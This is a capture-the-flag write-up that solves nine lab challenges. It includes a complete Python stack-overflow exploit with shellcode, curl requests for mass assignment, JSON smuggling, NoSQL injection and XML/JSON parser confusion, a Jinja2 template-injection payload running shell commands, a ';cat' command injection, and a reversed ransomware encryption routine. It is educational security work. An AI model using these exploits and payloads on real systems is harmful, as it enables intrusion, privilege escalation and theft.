---
title: CarnaVown
categories: [HackingClub]
tags: [web, pwn, mobile, reversing, crypto, idor, bufferoverflow, nosql, json, smuggling, adcs, ransomware]
media_subpath: /images/hackingclub_carnavown/
image:
  path: 'https://app.hackingclub.com/media/hc/carnavown.png'
---

# Summary

CarnaVown is a collection of diverse challenges ranging from web exploitation and binary pwn to mobile reversing and ransomware decryption. This post details the solutions for the following challenges:
- **EzyPwn**: A classic stack-based buffer overflow with a memory leak.
- **IdentityAPI**: A Golang structure tag misconfiguration leading to mass assignment.
- **Inlitware**: Reversing a custom .NET ransomware to decrypt a flagged file.
- **InstanceMetrics**: JSON smuggling due to parser inconsistencies between Go and Node.js.
- **Pinned**: An Android challenge involving NoSQL injection and client-side restriction bypass.
- **Vault**: XML vs JSON parsing confusion to forge an admin JWT.
- **Marketplace**: An IDOR vulnerability leading to account takeover.
- **Hosthub**: A Server-Side Template Injection (SSTI) vulnerability in a Python/Flask application.
- **AsciiArt**: A classic Command Injection vulnerability in a banner creation tool.

## EzyPwn

**Category:** Pwn / Binary Exploitation  
**Host:** `10.10.0.20:9000`

### Analysis

We are provided with a 64-bit ELF binary `ezynotes` and its source code. Initial checks with `checksec` reveal that `NX` (No-Execute) is disabled, meaning the stack is executable. Additionally, there is no stack canary and no PIE.

```bash
eezypwn git:(main) ✗ checksec EzyPwn/docker/ezynotes 
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

The source code shows two critical vulnerabilities:
1.  **Address Leak:** The program prints the address of the `note` buffer (`%p`), giving us a precise location on the stack.
2.  **Buffer Overflow:** The program uses `gets(note)` to read input into a 300-byte buffer. `gets()` is inherently unsafe as it does not check input length.

```c
printf("A gift for you: %p\n", note);
gets(note);
```

### Exploitation

Since the stack is executable and we know the buffer's address, we can perform a standard shellcode injection.
1.  **Capture the Leak:** Read the address printed by the server.
2.  **Craft Payload:** Contains shellcode + padding + the leaked address (to overwrite RIP).
3.  **Offset Calculation:** Disassembly of `main` shows the buffer is at `rbp-0x190` (400 bytes). To reach the return address, we need 400 bytes + 8 bytes (saved RBP) = 408 bytes.

![alt text](image99.png)

### Exploit Script

```python
import socket
import struct
import time
import sys

def p64(x):
    return struct.pack('<Q', x)

if len(sys.argv) > 1:
    args = sys.argv[1:]
    # Remove "REMOTE" if present (case-insensitive)
    if args and args[0].upper() == "REMOTE":
        args.pop(0)
    
    if len(args) == 1 and ':' in args[0]:
        # Handle IP:PORT format
        HOST, PORT_STR = args[0].split(':')
        PORT = int(PORT_STR)
    elif len(args) >= 2:
        # Handle IP PORT format
        HOST = args[0]
        PORT = int(args[1])
    elif len(args) == 1:
         # Handle just IP, default port
         HOST = args[0]
         PORT = 9000
    else:
        # Fallback or "REMOTE" only specified
        HOST = '127.0.0.1'
        PORT = 9000
else:
    HOST = '127.0.0.1'
    PORT = 9000

print(f"[*] Target: {HOST}:{PORT}")

# Shellcode: execute /bin/sh
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # 1. Receive data and parse the leak
    data = s.recv(1024).decode()
    print("[*] Received:", data.strip())

    if "A gift for you: " in data:
        # Extract the address
        parts = data.split("A gift for you: ")
        if len(parts) > 1:
            leak_str = parts[1].split()[0]
            leak_addr = int(leak_str, 16)
            print(f"[*] Leaked Buffer Address: {hex(leak_addr)}")
        else:
            print("[!] Could not parse leak correctly")
            exit(1)
    else:
        print("[!] Default banner not found, trying strict parse")
        # In case banner is different, try to just grab the hex if visible
        # For now, just fail
        exit(1)

    # 2. Build Payload
    # Buffer is at rbp-0x190 (400 bytes). Ret addr is at rbp+8.
    # Total offset = 400 + 8 = 408 bytes.
    offset = 408
    
    # We place shellcode at the start of the buffer (which we jump to)
    # Fill the rest with NOPs until the return address
    padding_len = offset - len(shellcode)
    
    # Payload = [Shellcode] + [Padding] + [Leaked Address (RIP)]
    payload = shellcode + (b'\x90' * padding_len) + p64(leak_addr)

    print(f"[*] Sending Payload ({len(payload)} bytes)...")
    s.send(payload + b'\n')

    # 3. Interactive Shell
    time.sleep(1) # Wait for shell to spawn
    
    # Send commands automatically
    print("[*] Sending commands...")
    s.send(b"id\n")
    s.send(b"cat /flag.txt\n")

    # Read loop
    print("[*] Response:")
    s.settimeout(2.0) # Set a timeout so we don't block forever
    while True:
        try:
            resp = s.recv(4096)
            if not resp: break
            print(resp.decode(errors='ignore'), end='')
        except socket.timeout:
            break
        except KeyboardInterrupt:
            break
        
except Exception as e:
    print(f"[!] Error: {e}")
finally:
    s.close()
```

```bash
➜  eezypwn git:(main) ✗ python3 exploit.py 
[*] Target: 127.0.0.1:9000
[*] Received: ========Welcome to EzyNotes========
A gift for you: 0x7ffee8f0dd70
[*] Leaked Buffer Address: 0x7ffee8f0dd70
[*] Sending Payload (416 bytes)...
[*] Sending commands...
[*] Response:
http://ezynotes.hc/7eJCltBtvtvuid=0(root) gid=0(root) groups=0(root)
hackingclub{fake_flag}
➜  eezypwn git:(main) ✗ python3 exploit.py REMOTE 10.10.0.20:9000
[*] Target: 10.10.0.20:9000
[*] Received: ========Welcome to EzyNotes========
A gift for you: 0x7ffef0c63370
[*] Leaked Buffer Address: 0x7ffef0c63370
[*] Sending Payload (416 bytes)...
[*] Sending commands...
[*] Response:
http://ezynotes.hc/R8bMy1E8bmauid=0(root) gid=0(root) groups=0(root)
hackingclub{ezypwn_buff3r_0v3rfl0w_v4n1ll4}%             
```

---

## IdentityAPI

**Category:** Web / Go  
**Host:** `10.10.0.25:8080`

### Analysis

The application is a User Identity Management API written in Go. The vulnerability exists in the `User` struct definition in `models.go` and how the `RegisterHandler` in `handlers_auth.go` processes user input.

**Vulnerable Code in `models.go`:**
The `IsAdmin` field uses a struct tag `json:"-,omitempty"`. This tag names the field `"-"` in JSON instead of ignoring it (which would be `json:"-"`).

```go
type User struct {
    ID       int
    Username string `json:"username"`
    Email    string `json:"email"`
    Password string `json:"password"`
    IsAdmin  bool   `json:"-,omitempty"`
}
```

**Vulnerable Code in `handlers_auth.go`:**
The handler decodes the request body directly into the `User` struct without filtering. This allows Mass Assignment of the `IsAdmin` field if the request contains the key `"-"`.

```go
func RegisterHandler(w http.ResponseWriter, r *http.Request) {
    var user User

    if err := json.NewDecoder(r.Body).Decode(&user); err != nil {
        // ...
    }
    // ...
    _, err := db.Exec(
        "INSERT INTO users (username, email, password, is_admin) VALUES (?, ?, ?, ?)",
        user.Username,
        user.Email,
        user.Password,
        user.IsAdmin,
    )
    // ...
}
```

### Exploitation

We register a new user with the payload `{"-": true}` to set `IsAdmin` to true. We then log in to receive an admin JWT and access the restricted endpoint.

```bash
curl -s http://10.10.0.21:8080/api/register --json '{"username":"railoca","email":"railoca@railoca.com","password":"pw","-": true}'  
{"message":"user created"}

curl -s http://10.10.0.21:8080/api/login --json '{"email":"railoca@railoca.com","password":"pw"}'
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InJhaWxvY2EiLCJlbWFpbCI6InJhaWxvY2FAcmFpbG9jYS5jb20iLCJpc19hZG1pbiI6dHJ1ZSwiZXhwIjoxNzcxNTE2MzQyLCJpYXQiOjE3NzE0Mjk5NDJ9.rx5hfIFWoxwI1Z2Hko7jAmR3QyKMhyh1bN0kzvlDm7I"}

curl -s http://10.10.0.21:8080/api/admin -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InJhaWxvY2EiLCJlbWFpbCI6InJhaWxvY2FAcmFpbG9jYS5jb20iLCJpc19hZG1pbiI6dHJ1ZSwiZXhwIjoxNzcxNTE2MzQyLCJpYXQiOjE3NzE0Mjk5NDJ9.rx5hfIFWoxwI1Z2Hko7jAmR3QyKMhyh1bN0kzvlDm7I'
{"flag":"hackingclub{1gn0r3d_d035n7_m34n_1gn0r3d}"}
```

**Flag:** `hackingclub{1gn0r3d_d035n7_m34n_1gn0r3d}`

---

## Inlitware

**Category:** Reversing / Crypto  

### Analysis

This crypto-ransomware challenge provided a .NET DLL (`Inlitware.dll`) and an encrypted `flag.txt`. Decompiling the DLL with `ilspycmd` revealed the encryption logic using hardcoded seeds.

**Encryption Routine:**
1.  **AES-CBC Encryption:** Key derived from MD5("6652fa25..."), IV="h3Ae6mdu/OIm5ngYKbj5Iw==".
2.  **XOR Obfuscation:** Output XORed with Key derived from MD5("1nL1t_1s_Th3_B3st_r4nts0mw4r3").
3.  **Base64 Encoding.**

```bash
ilspycmd Inlitware.dll
```

```c#
<SNIP>

	private static void EncryptFile(string filePath)
	{
		string key = MD5Encrypt("6652fa25-3bff-403b-9d47-33ccd4b50a11");
		byte[] iV = Convert.FromBase64String("h3Ae6mdu/OIm5ngYKbj5Iw==");
		string key2 = MD5Encrypt("1nL1t_1s_Th3_B3st_r4nts0mw4r3");
		byte[] text = File.ReadAllBytes(filePath);
		byte[] encryptedData = Encrypt(text, key, iV);
		string s = InlitEncryptor(encryptedData, key2);
		File.WriteAllBytes(filePath, Encoding.UTF8.GetBytes(s));
	}

	private static string MD5Encrypt(string text)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		using MD5 mD = MD5.Create();
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array2 = array;
		foreach (byte b in array2)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString();
	}

	private static byte[] Encrypt(byte[] text, string key, byte[] IV)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(key);
		using Aes aes = Aes.Create();
		aes.Key = bytes;
		aes.Mode = CipherMode.CBC;
		aes.IV = IV;
		using ICryptoTransform cryptoTransform = aes.CreateEncryptor();
		return cryptoTransform.TransformFinalBlock(text, 0, text.Length);
	}

	private static string InlitEncryptor(byte[] encryptedData, string key)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(key);
		byte[] array = new byte[encryptedData.Length];
		for (int i = 0; i < encryptedData.Length; i++)
		{
			array[i] = (byte)(encryptedData[i] ^ bytes[i % bytes.Length]);
		}
		return Convert.ToBase64String(array);
	}
}
```

### Decryption

We reverse the process: Base64 Decode -> XOR Decrypt -> AES Decrypt.

```python
import hashlib, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def md5(t): return hashlib.md5(t.encode()).hexdigest().encode()
def xor(d, k): return bytes([b ^ k[i % len(k)] for i, b in enumerate(d)])

aes_key = md5("6652fa25-3bff-403b-9d47-33ccd4b50a11")
xor_key = md5("1nL1t_1s_Th3_B3st_r4nts0mw4r3")
iv = base64.b64decode("h3Ae6mdu/OIm5ngYKbj5Iw==")

with open('flag.txt', 'r') as f:
    enc = base64.b64decode(f.read().strip())

step1 = xor(enc, xor_key)
cipher = AES.new(aes_key, AES.MODE_CBC, iv)
print(unpad(cipher.decrypt(step1), AES.block_size).decode())
```

```bash
CarnaVown git:(main) ✗ python3 initware/decrypt_flag.py 
AES Key Hex: bd18def1e763f1f082a676ceaaadf814
XOR Key Hex: 645218113b9e3a81f24468f26b7ab685
File Content (Base64+): zDxjEUgub9lCLI2euKbN6MhtvF+QNMlvLPRR10zGxCFCTfPyOI7f03rrn4f84yr+Je+aRKvSH5VQ+UNtt6h7cw==
Decrypted Flag: hackingclub{r3v3rs1ng_t0_d3c0d3_1nl1t_r4ns0mw4r3_ftw}

Decrypted important.txt: This file is important :)
```

**Flag:** `hackingclub{r3v3rs1ng_t0_d3c0d3_1nl1t_r4ns0mw4r3_ftw}`

---

## InstanceMetrics

**Category:** Web  
**Host:** `172.16.2.221`

### Analysis

The challenge features a Go API Gateway protecting a Node.js Metrics Service.

**Go Gateway (Port 80) (`main.go`):**
The gateway decodes the request into a struct and validates the `Command` field against a whitelist.

```go
// main.go
type InstanceMetricsRPC struct {
	Command string `json:"command"`
	Timeout int    `json:"timeout"`
}
// ...
allowedCommands := map[string]bool{"ps": true, "df": true, "whoami": true, "uname": true}
if rpc.Command == "" || !allowedCommands[rpc.Command] {
    // Return 403
}
```

**Node.js Backend (Port 3000) (`app.js`):**
The backend extracts `command` and executes it.

```javascript
// app.js
app.post('/', validateApiGatewayKey, (req, res) => {
    const { command, timeout } = req.body;
    // ...
    const output = execSync(command, options).toString();
    res.json({ output });
});
```

The vulnerability is **JSON Smuggling** due to parser differences.
- **Go's `encoding/json`:** Case-insensitive matchmaking. If multiple keys match (e.g., `command` and `Command`), the last one wins.
- **Node.js's `JSON.parse`:** Distinct keys, case-sensitive. It will see both `command` and `Command`.

### Exploitation

We send a JSON payload with duplicate keys: `command` (lowercase) and `Command` (capitalized).

```bash
➜  InstanceMetrics git:(main) ✗ curl -s 172.16.13.215/api/instance-metrics/ -H 'Content-Type: application/json' -d '{"command":"whoami"}'
{"output":"node\n"}

➜  InstanceMetrics git:(main) ✗ curl -s 172.16.13.215/api/instance-metrics/ -H 'Content-Type: application/json' -d '{"command":"cat /flag.txt"}'
Invalid or missing command

➜  InstanceMetrics git:(main) ✗ curl -s 172.16.13.215/api/instance-metrics/ -H 'Content-Type: application/json' -d '{"command":"cat /flag.txt","Command":"whoami"}'
{"output":"hackingclub{p4rs3r_d1ff3r3nt14ls_br34k_tru5t}\n"}%  
```

1.  **Go** sees `Command` ("df"), validates it as safe, and forwards the packet.
2.  **Node.js** extracts `command` ("cat /flag.txt") and executes it.

**Flag:** `hackingclub{p4rs3r_d1ff3r3nt14ls_br34k_tru5t}`

---

## Pinned

**Category:** Mobile / Web  
**Host:** `pinned.hc` (Virtual Host)

### Analysis

We are given an Android APK. Reverse engineering with `jadx` reveals the following:

**1. Virtual Host Routing (`RetroFitClient.java`):**
The app adds a `Host` header to every request using an OkHttp interceptor. This tells us the server uses virtual host routing.

```java
// RetroFitClient.java
public static final Response getRetroFitInstance$lambda$0(Interceptor.Chain chain) {
    return chain.proceed(chain.request().newBuilder().header("Host", ApiConfig.INSTANCE.getDomain()).build());
}
```

**2. Hidden Admin Endpoint (`ApiService.java`):**
The API interface definition shows an admin endpoint that isn't used in the main app flow.

```java
// ApiService.java
public interface ApiService {
    @GET("api/admin/flag")
    Call<LastLoginResponse> getFlag(@Path("flag") String flag);
    // ...
}
```

**3. Client-Side Token Check (`GenerateToken.java`):**
The app asks for a token on startup, but this check is purely client-side and can be reversed or ignored for API interaction.

```java
// GenerateToken.java
private final boolean v_chk_01(String input) {
    if (input.length() != 27) { return false; }
    // XOR check logic...
    // ...
}
```

**4. NoSQL Injection Vulnerability:**
The `login` endpoint is vulnerable to NoSQL injection in the password field.

### Exploitation

We bypass the admin login by injecting a MongoDB operator (`$gt`: "") into the password field.

```bash
pinned git:(main) ✗ curl 172.16.9.243/api/auth/login --json '{"username":"admin","password":{"$gt": ""}}' -H 'Host: pinned.hc' -H 'User-Agent: okhttp/4.12.0"' -i
HTTP/1.1 200 OK
Server: nginx/1.29.5
Date: Wed, 18 Feb 2026 16:08:50 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 66
Connection: keep-alive
X-Powered-By: Express
Authorization: Bearer 202602181608
ETag: W/"42-QKK1dnjJfrrzQyh04RoEdRBuv6o"

{"sucess":true,"msg":"login sucessful","lastLogin":"202602181608"}

➜  pinned git:(main) ✗ curl 172.16.9.243/api/admin/flag -H 'Authorization: Bearer 202602181608'
{"sucess":true,"flag":"hackingclub{byp4ss_runnt4m3_1s_f4n}"}
```

**Flag:** `hackingclub{byp4ss_runnt4m3_1s_f4n}`

---

## Vault

**Category:** Web  
**Host:** `172.16.12.177`

### Analysis

This challenge involves a Go proxy (`Vault`) and a Node.js Identity Provider (`IDP`).

**Vault (`controllers/auth.go`):**
The proxy unconditionally tries to unmarshal the IDP response as XML, regardless of the content type.

```go
// controllers/auth.go
func LoginHandler(proxy *httputil.ReverseProxy) http.HandlerFunc {
    // ...
    // VULNERABLE: Always unmarshals as XML
    if err := xml.Unmarshal(rec.Body.Bytes(), &loginResp); err != nil {
        // ...
    }
    // ...
    user := models.User{
        // ...
        IsAdmin:     loginResp.IsAdmin,
    }
    token, err := auth.CreateToken(user)
    // ...
}
```

**IDP (`app.js`):**
The IDP respects content negotiation and can return JSON, which Go's XML parser handles leniently (skipping until it finds `<`).

```javascript
// app.js
function sendResponse(res, data, statusCode = 200) {
    const acceptHeader = res.req.headers.accept || '';
    const shouldReturnJson = acceptHeader.toLowerCase().includes('application/json');

    if (shouldReturnJson) {
        res.status(statusCode).json(data);
    } else {
        // ... return XML
    }
}
```

Go's XML parser is lenient and will skip "garbage" (like JSON characters) until it finds a valid XML opening tag. By injecting XML into a field in a JSON response, we can trick Go into parsing our injected XML instead of the actual JSON structure.

### Exploitation

1.  **Register:** Create a user with a malicious `description` containing the XML we want Go to parse: `<response><isAdmin>true</isAdmin></response>`.
2.  **Login:** Request `application/json` so the IDP returns our malicious description unescaped inside a JSON string.
3.  **Confusion:** The Go service parses the JSON response as XML, finds our injected `<isAdmin>true</isAdmin>`, and issues an Admin JWT.

```bash
# 1. Register with XML injection
curl -X POST http://172.16.12.177/register \
  -d 'username=h&email=h@t.com&password=p&description=<response><isAdmin>true</isAdmin></response>'

# 2. Login as JSON -> Go parses XML -> Admin JWT
token=$(curl -X POST http://172.16.12.177/login -H "Accept: application/json" -d 'email=h@t.com&password=p' | jq -r .token)

# 3. Flag
curl http://172.16.12.177/admin -H "Authorization: Bearer $token"
```

```bash
vault git:(main) ✗ curl -sX POST http://172.16.13.204/register \
  -d 'username=railoca&email=railoca@t.com&password=p&description=<response><isAdmin>true</isAdmin></response>' && token=$(curl -sX POST http://172.16.13.204/login -H "Accept: application/json" -d 'email=h@t.com&password=p' | jq -r .token) && \
curl -s http://172.16.13.204/admin -H "Authorization: Bearer $token" 

<?xml version="1.0"?>
<response>
    <id>7f68f495-b1f2-4637-8251-ff98d3523e57</id>
    <isAdmin>false</isAdmin>
    <username>railoca</username>
    <email>railoca@t.com</email>
    <description>&lt;response>&lt;isAdmin>true&lt;/isAdmin>&lt;/response></description>
    <updatedAt>Wed Feb 18 2026 16:14:46 GMT+0000 (Coordinated Universal Time)</updatedAt>
    <createdAt>Wed Feb 18 2026 16:14:46 GMT+0000 (Coordinated Universal Time)</createdAt>
</response>{"flag":"hackingclub{p4rs1ng_c0nfus10n_1s_fun}","message":"Welcome to the admin panel","user":{"id":"","username":"","email":"","description":"","isAdmin":true}}
```

**Flag:** `hackingclub{p4rs1ng_c0nfus10n_1s_fun}`

---

## Marketplace

**Category:** Web  
**Host:** `172.16.4.89`

### Analysis

The target application allows users to update their profile information. The update endpoint `/profile/update_password.php` takes a `user_id` parameter in the POST body.

![alt text](image.png)

![alt text](image-1.png)

Testing reveals that the API does not verify if the `user_id` matches the currently authenticated user session. This is an **Insecure Direct Object Reference (IDOR)** or **Broken Object Level Authorization (BOLA)** vulnerability.

### Exploitation

We can change the password of any user (including the admin, typically `user_id=1`) by simply modifying the `user_id` parameter in the request.

1.  **Login** as a low-privileged user to get a valid session.
2.  **Send Update Request:** Target `/profile/update_password.php` with `user_id=1` and a new password.
3.  **Login as Admin:** Use the new credentials to access the admin account and retrieve the flag.

![alt text](image-2.png)

![alt text](image-3.png)

**Flag:** `hackingclub{b0l4_t0_acC0uNt_T4k3_0v3R}`


---

## Hosthub

**Category:** Web  
**Host:** `10.10.0.21:5000`

### Analysis

The target initially shows a web page where the only place to interact is at the `Contact Us` page.

![alt text](image-4.png)

Upon sending the request, we can see our name reflected on the page

![alt text](image-5.png)

We can try for a simple `SSTI` payload to see if the backend process it and we can confirm the `SSTI` vulnerability by sending a simple `{% raw %}{{7*7}}{% endraw %}` payload

![alt text](image-6.png)

### Exploitation

We can send a simple `SSTI` payload to read the `/flag.txt` file

![alt text](image-7.png)

**Payload:** `{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}{% endraw %}` 

**Flag:** `hackingclub{S3rV3r_S1d3_T3mpl4t3_1nj3ct10n_j1nj42}`

---

## AsciiArt

**Category:** Web
**Host:** 10.10.0.22:5000

### Analysis

The target introduces us to a page where we can create our Banner Art

![alt text](image-8.png)

![alt text](image-9.png)

Analyzing the request we send the text in the `cmd` parameter, so we can test for injections on this field

![alt text](image-10.png)

By sending the payload `;id` we can confirm a command injection

![alt text](image-11.png)

### Exploitation

![alt text](image-12.png)

**Payload:** `;cat /flag.txt`

**Flag:** `hackingclub{L3g4cy_C0mm4nd_Inj3ct10n_FTW}`